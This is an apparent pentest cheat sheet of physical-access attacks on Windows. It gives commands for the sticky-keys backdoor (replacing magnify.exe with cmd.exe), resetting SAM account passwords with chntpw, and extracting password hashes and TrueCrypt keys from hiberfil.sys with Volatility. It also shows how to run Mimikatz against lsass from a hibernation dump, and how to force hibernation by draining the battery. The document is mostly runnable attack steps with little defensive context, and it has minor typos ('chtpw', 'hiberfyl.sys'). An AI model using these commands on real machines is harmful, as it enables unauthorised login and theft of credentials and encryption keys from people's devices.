## Sticky Keys ##
```
# Backup a binary and replace with cmd
Ren c:\windows\system32\magnify.exe c:\windows\system32\magnify.exe.bak
Copy c:\windows\system32\cmd.exe c:\windows\system32\magnify.exe

# Binaries to invoke
• SETHC: sethc.exe is invoked when SHIFT is pressed 5 times
• UTILMAN: Utilman.exe is invoked by pressing WINDOWS+U
• OSK: osk.exe is invoked by pressing WINDOWS+U, then launching the on-screen keyboard
• DISP: DisplaySwitch.exe is invoked by pressing WINDOWS+P
```

## Method chtpw ##
```
# Open File Manager and click on "other locations" in bottom left
# cd to Windows\System32\config
# List accounts on the system
chtpw -l SAM
# Edit an account
chntpw -u Administrator SAM
```

## Method: Attacking the hibernation file ##
```
# This file is in the root of the drive: c:\hiberfyl.sys.
The basic tool for the task is Volatility; with it we can do the following things:
• Obtaining information about the hibernation file: 
vol.exe hibinfo -f hiberfil.sys
• Convert it to raw format: 
vol.exe imagecopy -f hiberfil.sys -O hiberfil.bin
• Convert it to DMP format (Windbg compatible): 
vol.exe raw2dmp -f hiberfil.sys -O hiberfil.dmp
• Obtaining the browsing history: 
vol.exe iehistory -f hiberfil.sys
• Obtaining local password hashes: 
vol.exe hashdump -f hiberfil.sys
• Obtaining Truecrypt cryptographic keys: 
vol.exe truecryptpassphrase -f hiberfil.sys
```

## Method: Hibernation File and Mimikatz ##
```
Despite we have a Mimikatz plugin for Volatility, it is very limited so it’s better to work directly with Mimikatz. For that we have to:
• Convert the hiberfil.sys file to a format compatible with Windbg (DMP):
  o vol.exe raw2dmp -f hiberfil.sys -O hiberfil.dmp –profile=Win7SP0x64
• Load the DMP into Windbg:
  o .symfix => Configures the Microsoft symbol repositories.
  o .reload => Reloads the needed symbols.
  o .load wow64exts => Loads the module for debugging WOW64 processes.
  o !wow64exts.sw => Activates WOW64 extensions.
• Load Mimikatz module in Windbg:
  o .load c:\Users\rpinuaga\Desktop\bad-hibernation\demo\mimilib64.dll => Loads the Mimikatz module.
  o !process 0 0 lsass.exe => Looks for the lsass process (Local Security Authority Subsystem Service).
  o .process /r /p fffffa800424e910 => Configures the context to the lsass process.
  o !mimikatz

# Note: The hibernation file is never deleted, only its headers are modified when it is used for rebooting. This way, if the computer has been hibernated at any time in the past, we will have this file. If not, we need to force an hibernation.
# Note: Force hibernation by getting battery to critical level. This is configured by default in all Windows version up to Windows 10.
```

## References ##
```
https://www.pentester.es/evil-maid-attacks-with-hibernation/
https://book.hacktricks.xyz/hardware-physical-access/physical-attacks
https://www.red-gate.com/simple-talk/sysadmin/general/game-over-gaining-physical-access-to-a-computer/
```
